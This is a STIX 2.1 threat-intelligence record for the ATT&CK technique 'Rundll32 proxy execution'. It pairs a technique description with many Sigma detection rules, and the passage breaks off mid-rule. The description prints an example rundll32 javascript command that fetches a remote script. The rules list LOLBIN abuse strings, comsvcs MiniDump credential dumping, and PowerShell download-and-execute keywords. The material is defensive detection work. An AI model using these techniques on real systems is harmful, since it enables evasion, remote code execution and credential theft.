{
    "type": "malware-behavior",
    "spec_version": "2.1",
    "id": "malware-behavior--24fb16c8-6f59-4cdd-ba01-8797b96f3260",
    "created": "2024-08-13T14:46:36.888716Z",
    "modified": "2024-08-13T14:46:44.796297Z",
    "name": "System Binary Proxy Execution: Rundll32",
    "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. [1]Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:'..\\mshtml,RunHTMLApplication ';document.write();GetObject('script:https[:]//www[.]example[.]com/malicious.sct')'  This behavior has been seen used by malware such as Poweliks. [2]Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones.[3][4] DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.[5]",
    "object_marking_refs": [
        "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
    ],
    "external_references": [
        {
            "source_name": "MITRE ATT&CK",
            "url": "https://attack.mitre.org/techniques/T1218/011",
            "external_id": "T1218/011"
        }
    ],
    "x_mitre_detection_rules": [
        {
            "author": "Florian Roth (Nextron Systems)",
            "date": "2018/06/25",
            "description": "Detects the creation of a remote thread from a Powershell process in an uncommon target process",
            "detection": {
                "condition": "selection",
                "selection": {
                    "SourceImage|endswith": [
                        "\\powershell.exe",
                        "\\pwsh.exe"
                    ],
                    "TargetImage|endswith": [
                        "\\rundll32.exe",
                        "\\regsvr32.exe"
                    ]
                }
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "99b97608-3e21-4bfe-8217-2a127c396a0e",
            "level": "medium",
            "logsource": {
                "category": "create_remote_thread",
                "product": "windows"
            },
            "modified": "2023/11/10",
            "references": [
                "https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html"
            ],
            "related": [
                {
                    "id": "eeb2e3dc-c1f4-40dd-9bd5-149ee465ad50",
                    "type": "similar"
                }
            ],
            "status": "experimental",
            "tags": [
                "attack.defense_evasion",
                "attack.execution",
                "attack.t1218.011",
                "attack.t1059.001"
            ],
            "title": "Remote Thread Creation Via PowerShell In Uncommon Target"
        },
        {
            "author": "Christopher Peacock @securepeacock, SCYTHE @scythe_io",
            "date": "2023/04/28",
            "description": "Detects a \"winlogon.exe\" process that initiate network communications with public IP addresses",
            "detection": {
                "condition": "selection and not 1 of filter_main_*",
                "filter_main_local_ranges": {
                    "DestinationIp|cidr": [
                        "127.0.0.0/8",
                        "10.0.0.0/8",
                        "172.16.0.0/12",
                        "192.168.0.0/16",
                        "169.254.0.0/16",
                        "::1/128",
                        "fe80::/10",
                        "fc00::/7"
                    ]
                },
                "selection": {
                    "Image|endswith": "\\winlogon.exe",
                    "Initiated": "true"
                }
            },
            "falsepositives": [
                "Communication to other corporate systems that use IP addresses from public address spaces"
            ],
            "id": "7610a4ea-c06d-495f-a2ac-0a696abcfd3b",
            "level": "medium",
            "logsource": {
                "category": "network_connection",
                "product": "windows"
            },
            "modified": "2024/03/12",
            "references": [
                "https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.execution",
                "attack.command_and_control",
                "attack.t1218.011"
            ],
            "title": "Outbound Network Connection To Public IP Via Winlogon"
        },
        {
            "author": "Florian Roth (Nextron Systems)",
            "date": "2017/11/04",
            "description": "Detects a rundll32 that communicates with public IP addresses",
            "detection": {
                "condition": "selection and not 1 of filter_main_*",
                "filter_main_local_ranges": {
                    "DestinationIp|cidr": [
                        "127.0.0.0/8",
                        "10.0.0.0/8",
                        "172.16.0.0/12",
                        "192.168.0.0/16",
                        "169.254.0.0/16",
                        "::1/128",
                        "fe80::/10",
                        "fc00::/7"
                    ]
                },
                "filter_main_app_sdb": {
                    "CommandLine|endswith": "\\system32\\PcaSvc.dll,PcaPatchSdbTask"
                },
                "filter_main_azure_managed": {
                    "SourceHostname|endswith": ".internal.cloudapp.net"
                },
                "filter_main_ms_ranges": {
                    "DestinationIp|cidr": [
                        "20.0.0.0/8",
                        "51.103.0.0/16",
                        "51.104.0.0/16",
                        "51.105.0.0/16"
                    ]
                },
                "filter_main_svchost_update_processes": {
                    "DestinationPort": 443,
                    "ParentImage": "C:\\Windows\\System32\\svchost.exe"
                },
                "selection": {
                    "Image|endswith": "\\rundll32.exe",
                    "Initiated": "true"
                }
            },
            "falsepositives": [
                "Communication to other corporate systems that use IP addresses from public address spaces"
            ],
            "id": "cdc8da7d-c303-42f8-b08c-b4ab47230263",
            "level": "medium",
            "logsource": {
                "category": "network_connection",
                "product": "windows"
            },
            "modified": "2024/03/13",
            "references": [
                "https://www.hybrid-analysis.com/sample/759fb4c0091a78c5ee035715afe3084686a8493f39014aea72dae36869de9ff6?environmentId=100"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011",
                "attack.execution"
            ],
            "title": "Rundll32 Internet Connection"
        },
        {
            "author": "Swachchhanda Shrawan Poudel",
            "date": "2024/02/28",
            "description": "Detects windows utilities loading an unsigned or untrusted DLL.\nAdversaries often abuse those programs to proxy execution of malicious code.\n",
            "detection": {
                "condition": "selection and not 1 of filter_main_*",
                "filter_main_sig_status": {
                    "SignatureStatus": [
                        "errorChaining",
                        "errorCode_endpoint",
                        "errorExpired",
                        "trusted"
                    ]
                },
                "filter_main_sig_status_empty": {
                    "SignatureStatus": [
                        "",
                        "-"
                    ]
                },
                "filter_main_sig_status_null": {
                    "SignatureStatus": null
                },
                "filter_main_signed": {
                    "Signed": "true"
                },
                "filter_main_signed_empty": {
                    "Signed": [
                        "",
                        "-"
                    ]
                },
                "filter_main_signed_null": {
                    "Signed": null
                },
                "selection": {
                    "Image|endswith": [
                        "\\InstallUtil.exe",
                        "\\RegAsm.exe",
                        "\\RegSvcs.exe",
                        "\\regsvr32.exe",
                        "\\rundll32.exe"
                    ]
                }
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "b5de0c9a-6f19-43e0-af4e-55ad01f550af",
            "level": "medium",
            "logsource": {
                "category": "image_load",
                "product": "windows"
            },
            "modified": "2024/03/07",
            "references": [
                "https://www.elastic.co/security-labs/Hunting-for-Suspicious-Windows-Libraries-for-Execution-and-Evasion",
                "https://akhere.hashnode.dev/hunting-unsigned-dlls-using-kql",
                "https://unit42.paloaltonetworks.com/unsigned-dlls/?web_view=true"
            ],
            "status": "experimental",
            "tags": [
                "attack.t1218.011",
                "attack.t1218.010",
                "attack.defense_evasion"
            ],
            "title": "Unsigned DLL Loaded by Windows Utility"
        },
        {
            "author": "Christopher Peacock @securepeacock, SCYTHE @scythe_io",
            "date": "2022/04/27",
            "description": "Detects the creation of screensaver files (.scr) outside of system folders. Attackers may execute an application as an \".SCR\" file using \"rundll32.exe desk.cpl,InstallScreenSaver\" for example.",
            "detection": {
                "condition": "selection and not filter",
                "filter": {
                    "TargetFilename|contains": [
                        ":\\$WINDOWS.~BT\\NewOS\\",
                        ":\\Windows\\System32\\",
                        ":\\Windows\\SysWOW64\\",
                        ":\\Windows\\WinSxS\\",
                        ":\\WUDownloadCache\\"
                    ]
                },
                "selection": {
                    "TargetFilename|endswith": ".scr"
                }
            },
            "falsepositives": [
                "The installation of new screen savers by third party software"
            ],
            "id": "c048f047-7e2a-4888-b302-55f509d4a91d",
            "level": "medium",
            "logsource": {
                "category": "file_event",
                "product": "windows"
            },
            "modified": "2023/08/23",
            "references": [
                "https://lolbas-project.github.io/lolbas/Libraries/Desk/"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "SCR File Write Event"
        },
        {
            "author": "Maxim Pavlunin",
            "date": "2020/04/01",
            "description": "Detects a suspicious execution of a Microsoft HTML Help (HH.exe)",
            "detection": {
                "condition": "all of selection_*",
                "selection_img": [
                    {
                        "OriginalFileName": "HH.exe"
                    },
                    {
                        "Image|endswith": "\\hh.exe"
                    }
                ],
                "selection_paths": {
                    "CommandLine|contains": [
                        ".application",
                        "\\AppData\\Local\\Temp\\",
                        "\\Content.Outlook\\",
                        "\\Downloads\\",
                        "\\Users\\Public\\",
                        "\\Windows\\Temp\\"
                    ]
                }
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "e8a95b5e-c891-46e2-b33a-93937d3abc31",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2023/04/12",
            "references": [
                "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/",
                "https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-27939090904026cc396b0b629c8e4314acd6f5dac40a676edbc87f4567b47eb7",
                "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/",
                "https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.execution",
                "attack.initial_access",
                "attack.t1047",
                "attack.t1059.001",
                "attack.t1059.003",
                "attack.t1059.005",
                "attack.t1059.007",
                "attack.t1218",
                "attack.t1218.001",
                "attack.t1218.010",
                "attack.t1218.011",
                "attack.t1566",
                "attack.t1566.001"
            ],
            "title": "Suspicious HH.EXE Execution"
        },
        {
            "author": "Florian Roth (Nextron Systems)",
            "date": "2021/03/05",
            "description": "Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452",
            "detection": {
                "condition": "all of selection*",
                "selection1": {
                    "CommandLine|contains": "rundll32.exe"
                },
                "selection2": {
                    "CommandLine|contains": [
                        ".sys,",
                        ".sys "
                    ]
                }
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "731231b9-0b5d-4219-94dd-abb6959aa7ea",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2022/10/09",
            "references": [
                "https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "Suspicious Rundll32 Activity Invoking Sys File"
        },
        {
            "author": "Hieu Tran",
            "date": "2023/03/13",
            "description": "Detects the execution of Rundll32.exe with DLL files masquerading as image files",
            "detection": {
                "condition": "all of selection_*",
                "selection_cli": {
                    "CommandLine|contains": [
                        ".bmp",
                        ".cr2",
                        ".eps",
                        ".gif",
                        ".ico",
                        ".jpeg",
                        ".jpg",
                        ".nef",
                        ".orf",
                        ".png",
                        ".raw",
                        ".sr2",
                        ".tif",
                        ".tiff"
                    ]
                },
                "selection_img": [
                    {
                        "Image|endswith": "\\rundll32.exe"
                    },
                    {
                        "OriginalFileName": "RUNDLL32.exe"
                    }
                ]
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "4aa6040b-3f28-44e3-a769-9208e5feb5ec",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "references": [
                "https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution"
            ],
            "related": [
                {
                    "id": "089fc3d2-71e8-4763-a8a5-c97fbb0a403e",
                    "type": "similar"
                }
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "Suspicious Rundll32 Execution With Image Extension"
        },
        {
            "author": "elhoim, CD_ROM_",
            "date": "2022/04/27",
            "description": "Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way",
            "detection": {
                "condition": "selection and not filter",
                "filter": {
                    "ParentCommandLine|contains": "\\shell32.dll,Control_RunDLL"
                },
                "selection": {
                    "Image|endswith": "\\explorer.exe",
                    "ParentImage|endswith": "\\rundll32.exe"
                }
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "caa06de8-fdef-4c91-826a-7f9e163eef4b",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2022/05/25",
            "references": [
                "https://redcanary.com/blog/intelligence-insights-november-2021/"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "RunDLL32 Spawning Explorer"
        },
        {
            "author": "Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou",
            "date": "2022/01/13",
            "description": "Detects the execution of rundll32 with a command line that doesn't contain a common extension",
            "detection": {
                "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*",
                "filter_main_empty": {
                    "CommandLine": ""
                },
                "filter_main_known_extension": [
                    {
                        "CommandLine|contains": [
                            ".cpl ",
                            ".cpl,",
                            ".cpl\"",
                            ".cpl'",
                            ".dll ",
                            ".dll,",
                            ".dll\"",
                            ".dll'",
                            ".inf ",
                            ".inf,",
                            ".inf\"",
                            ".inf'"
                        ]
                    },
                    {
                        "CommandLine|endswith": [
                            ".cpl",
                            ".dll",
                            ".inf"
                        ]
                    }
                ],
                "filter_main_localserver": {
                    "CommandLine|contains": " -localserver "
                },
                "filter_main_null": {
                    "CommandLine": null
                },
                "filter_main_zzzzInvokeManagedCustomActionOutOfProc": {
                    "CommandLine|contains|all": [
                        ":\\Windows\\Installer\\",
                        ".tmp",
                        "zzzzInvokeManagedCustomActionOutOfProc"
                    ],
                    "ParentImage|endswith": "\\msiexec.exe"
                },
                "filter_optional_EdgeUpdate": {
                    "ParentCommandLine|contains|all": [
                        ":\\Users\\",
                        "\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{",
                        "\\EDGEMITMP_",
                        ".tmp\\setup.exe",
                        "--install-archive=",
                        "--previous-version=",
                        "--msedgewebview --verbose-logging --do-not-launch-msedge --user-level"
                    ]
                },
                "selection": [
                    {
                        "Image|endswith": "\\rundll32.exe"
                    },
                    {
                        "OriginalFileName": "RUNDLL32.EXE"
                    }
                ]
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "c3a99af4-35a9-4668-879e-c09aeb4f2bdf",
            "level": "medium",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2024/04/04",
            "references": [
                "https://twitter.com/mrd0x/status/1481630810495139841?s=12"
            ],
            "status": "experimental",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "Rundll32 Execution With Uncommon DLL Extension"
        },
        {
            "author": "Florian Roth (Nextron Systems)",
            "date": "2017/04/15",
            "description": "Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits",
            "detection": {
                "condition": "all of selection_* and not filter",
                "filter": {
                    "CommandLine|contains": "Shell32.dll"
                },
                "selection_img": [
                    {
                        "Image|endswith": "\\rundll32.exe"
                    },
                    {
                        "OriginalFileName": "RUNDLL32.EXE"
                    }
                ],
                "selection_parent": {
                    "ParentImage|endswith": "\\System32\\control.exe"
                }
            },
            "falsepositives": [
                "Unknown"
            ],
            "fields": [
                "CommandLine",
                "ParentCommandLine"
            ],
            "id": "d7eb979b-c2b5-4a6f-a3a7-c87ce6763819",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2023/02/09",
            "status": "test",
            "references": [
                "https://twitter.com/rikvduijn/status/853251879320662017",
                "https://twitter.com/felixw3000/status/853354851128025088"
            ],
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "Suspicious Control Panel DLL Load"
        },
        {
            "author": "juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
            "date": "2019/01/16",
            "description": "Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities",
            "detection": {
                "condition": "selection and not 1 of filter_main_*",
                "filter_main_parent_cpl": {
                    "CommandLine|contains|all": [
                        "Shell32.dll",
                        "Control_RunDLL",
                        ".cpl"
                    ],
                    "ParentCommandLine|contains": ".cpl",
                    "ParentImage": "C:\\Windows\\System32\\control.exe"
                },
                "filter_main_screensaver": {
                    "CommandLine|contains": "shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver"
                },
                "filter_main_startmenu": {
                    "CommandLine|endswith": ".cpl\",",
                    "CommandLine|startswith": "\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \"C:\\Windows\\System32\\",
                    "ParentImage": "C:\\Windows\\System32\\control.exe"
                },
                "selection": [
                    {
                        "CommandLine|contains|all": [
                            "javascript:",
                            ".RegisterXLL"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "url.dll",
                            "OpenURL"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "url.dll",
                            "OpenURLA"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "url.dll",
                            "FileProtocolHandler"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "zipfldr.dll",
                            "RouteTheCall"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "shell32.dll",
                            "Control_RunDLL"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "shell32.dll",
                            "ShellExec_RunDLL"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "mshtml.dll",
                            "PrintHTML"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "advpack.dll",
                            "LaunchINFSection"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "advpack.dll",
                            "RegisterOCX"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "ieadvpack.dll",
                            "LaunchINFSection"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "ieadvpack.dll",
                            "RegisterOCX"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "ieframe.dll",
                            "OpenURL"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "shdocvw.dll",
                            "OpenURL"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "syssetup.dll",
                            "SetupInfObjectInstallAction"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "setupapi.dll",
                            "InstallHinfSection"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "pcwutl.dll",
                            "LaunchApplication"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "dfshim.dll",
                            "ShOpenVerbApplication"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "dfshim.dll",
                            "ShOpenVerbShortcut"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "scrobj.dll",
                            "GenerateTypeLib",
                            "http"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "shimgvw.dll",
                            "ImageView_Fullscreen",
                            "http"
                        ]
                    },
                    {
                        "CommandLine|contains|all": [
                            "comsvcs.dll",
                            "MiniDump"
                        ]
                    }
                ]
            },
            "falsepositives": [
                "False positives depend on scripts and administrative tools used in the monitored environment"
            ],
            "id": "e593cf51-88db-4ee1-b920-37e89012a3c9",
            "level": "medium",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2023/05/17",
            "references": [
                "http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/",
                "https://twitter.com/Hexacorn/status/885258886428725250",
                "https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52",
                "https://twitter.com/nas_bench/status/1433344116071583746",
                "https://twitter.com/eral4m/status/1479106975967240209",
                "https://twitter.com/eral4m/status/1479080793003671557"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "Potentially Suspicious Rundll32 Activity"
        },
        {
            "author": "Alfie Champion (ajpc500)",
            "date": "2021/06/02",
            "description": "F-Secure C3 produces DLLs with a default exported StartNodeRelay function.",
            "detection": {
                "condition": "selection",
                "selection": {
                    "CommandLine|contains|all": [
                        "rundll32.exe",
                        ".dll",
                        "StartNodeRelay"
                    ]
                }
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "b18c9d4c-fac9-4708-bd06-dd5bfacf200f",
            "level": "critical",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2023/03/05",
            "references": [
                "https://github.com/FSecureLABS/C3/blob/11a081fd3be2aaf2a879f6b6e9a96ecdd24966ef/Src/NodeRelayDll/NodeRelayDll.cpp#L12"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "HackTool - F-Secure C3 Load by Rundll32"
        },
        {
            "author": "Julia Fomina, oscd.community",
            "date": "2020/10/05",
            "description": "Detects launch of executable by calling the LaunchApplication function from pcwutl.dll library.",
            "detection": {
                "condition": "all of selection_*",
                "selection_cli": {
                    "CommandLine|contains|all": [
                        "pcwutl",
                        "LaunchApplication"
                    ]
                },
                "selection_img": [
                    {
                        "Image|endswith": "\\rundll32.exe"
                    },
                    {
                        "OriginalFileName": "RUNDLL32.EXE"
                    }
                ]
            },
            "falsepositives": [
                "Use of Program Compatibility Troubleshooter Helper"
            ],
            "id": "9386d78a-7207-4048-9c9f-a93a7c2d1c05",
            "level": "medium",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "references": [
                "https://lolbas-project.github.io/lolbas/Libraries/Pcwutl/",
                "https://twitter.com/harr0ey/status/989617817849876488"
            ],
            "modified": "2023/02/09",
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "Code Execution via Pcwutl.dll"
        },
        {
            "author": "Maxim Pavlunin, Nasreddine Bencherchali (Nextron Systems)",
            "date": "2020/04/01",
            "description": "Detects a suspicious child process of a Microsoft HTML Help (HH.exe)",
            "detection": {
                "condition": "selection",
                "selection": {
                    "Image|endswith": [
                        "\\CertReq.exe",
                        "\\CertUtil.exe",
                        "\\cmd.exe",
                        "\\cscript.exe",
                        "\\installutil.exe",
                        "\\MSbuild.exe",
                        "\\MSHTA.EXE",
                        "\\msiexec.exe",
                        "\\powershell.exe",
                        "\\pwsh.exe",
                        "\\regsvr32.exe",
                        "\\rundll32.exe",
                        "\\schtasks.exe",
                        "\\wmic.exe",
                        "\\wscript.exe"
                    ],
                    "ParentImage|endswith": "\\hh.exe"
                }
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2023/04/12",
            "references": [
                "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/",
                "https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-27939090904026cc396b0b629c8e4314acd6f5dac40a676edbc87f4567b47eb7",
                "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/",
                "https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.execution",
                "attack.initial_access",
                "attack.t1047",
                "attack.t1059.001",
                "attack.t1059.003",
                "attack.t1059.005",
                "attack.t1059.007",
                "attack.t1218",
                "attack.t1218.001",
                "attack.t1218.010",
                "attack.t1218.011",
                "attack.t1566",
                "attack.t1566.001"
            ],
            "title": "HTML Help HH.EXE Suspicious Child Process"
        },
        {
            "author": "Christian Burkard (Nextron Systems)",
            "date": "2021/11/24",
            "description": "Detects shell32.dll executing a DLL in a suspicious directory",
            "detection": {
                "condition": "all of selection_*",
                "selection_cli": {
                    "CommandLine|contains|all": [
                        "shell32.dll",
                        "Control_RunDLL"
                    ],
                    "CommandLine|contains": [
                        "%AppData%",
                        "%LocalAppData%",
                        "%Temp%",
                        "%tmp%",
                        "\\AppData\\",
                        "\\Temp\\",
                        "\\Users\\Public\\"
                    ]
                },
                "selection_img": [
                    {
                        "Image|endswith": "\\rundll32.exe"
                    },
                    {
                        "OriginalFileName": "RUNDLL32.EXE"
                    }
                ]
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "32b96012-7892-429e-b26c-ac2bf46066ff",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "references": [
                "https://www.group-ib.com/resources/threat-research/red-curl-2.html"
            ],
            "modified": "2023/02/09",
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.execution",
                "attack.t1218.011"
            ],
            "title": "Shell32 DLL Execution in Suspicious Directory"
        },
        {
            "author": "Alexander Rausch",
            "date": "2020/06/24",
            "description": "Detects actions caused by the RedMimicry Winnti playbook a automated breach emulations utility",
            "detection": {
                "condition": "selection",
                "selection": {
                    "CommandLine|contains": [
                        "gthread-3.6.dll",
                        "\\Windows\\Temp\\tmp.bat",
                        "sigcmm-2.4.dll"
                    ],
                    "Image|endswith": [
                        "\\rundll32.exe",
                        "\\cmd.exe"
                    ]
                }
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "95022b85-ff2a-49fa-939a-d7b8f56eeb9b",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2023/03/01",
            "references": [
                "https://redmimicry.com/posts/redmimicry-winnti/"
            ],
            "status": "test",
            "tags": [
                "attack.execution",
                "attack.defense_evasion",
                "attack.t1106",
                "attack.t1059.003",
                "attack.t1218.011"
            ],
            "title": "HackTool - RedMimicry Winnti Playbook Execution"
        },
        {
            "author": "Christopher Peacock @securepeacock, SCYTHE @scythe_io, TactiKoolSec",
            "date": "2022/04/28",
            "description": "An attacker may execute an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver",
            "detection": {
                "condition": "all of selection_*",
                "selection_cli": {
                    "CommandLine|contains": "InstallScreenSaver"
                },
                "selection_img": [
                    {
                        "Image|endswith": "\\rundll32.exe"
                    },
                    {
                        "OriginalFileName": "RUNDLL32.EXE"
                    }
                ]
            },
            "falsepositives": [
                "Legitimate installation of a new screensaver"
            ],
            "id": "15bd98ea-55f4-4d37-b09a-e7caa0fa2221",
            "level": "medium",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "references": [
                "https://lolbas-project.github.io/lolbas/Libraries/Desk/",
                "https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1218.011/T1218.011.md#atomic-test-13---rundll32-with-deskcpl"
            ],
            "modified": "2023/02/09",
            "status": "test",
            "tags": [
                "attack.t1218.011",
                "attack.defense_evasion"
            ],
            "title": "Rundll32 InstallScreenSaver Execution"
        },
        {
            "author": "Konstantin Grishchenko, oscd.community",
            "date": "2020/10/07",
            "description": "setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file.",
            "detection": {
                "condition": "selection",
                "selection": {
                    "Image|endswith": "\\runonce.exe",
                    "ParentImage|endswith": "\\rundll32.exe",
                    "ParentCommandLine|contains|all": [
                        "setupapi.dll",
                        "InstallHinfSection"
                    ]
                }
            },
            "falsepositives": [
                "Scripts and administrative tools that use INF files for driver installation with setupapi.dll"
            ],
            "fields": [
                "ComputerName",
                "User",
                "CommandLine",
                "ParentCommandLine"
            ],
            "id": "285b85b1-a555-4095-8652-a8a4106af63f",
            "level": "medium",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2021/11/27",
            "status": "test",
            "references": [
                "https://lolbas-project.github.io/lolbas/Libraries/Setupapi/",
                "https://gist.githubusercontent.com/bohops/0cc6586f205f3691e04a1ebf1806aabd/raw/baf7b29891bb91e76198e30889fbf7d6642e8974/calc_exe.inf",
                "https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf",
                "https://twitter.com/Z3Jpa29z/status/1313742350292746241?s=20"
            ],
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "Suspicious Rundll32 Setupapi.dll Activity"
        },
        {
            "author": "Markus Neis, Nasreddine Bencherchali (Nextron Systems)",
            "date": "2018/08/25",
            "description": "Detects potential PowerShell execution from a DLL instead of the usual PowerShell process as seen used in PowerShdll.\nThis detection assumes that PowerShell commands are passed via the CommandLine.\n",
            "detection": {
                "condition": "all of selection_*",
                "selection_cli": {
                    "CommandLine|contains": [
                        "Default.GetString",
                        "DownloadString",
                        "FromBase64String",
                        "ICM ",
                        "IEX ",
                        "Invoke-Command",
                        "Invoke-Expression"
                    ]
                },
                "selection_img": [
                    {
                        "Image|endswith": [
                            "\\InstallUtil.exe",
                            "\\RegAsm.exe",
                            "\\RegSvcs.exe",
                            "\\regsvr32.exe",
                            "\\rundll32.exe"
                        ]
                    },
                    {
                        "OriginalFileName": [
                            "InstallUtil.exe",
                            "RegAsm.exe",
                            "RegSvcs.exe",
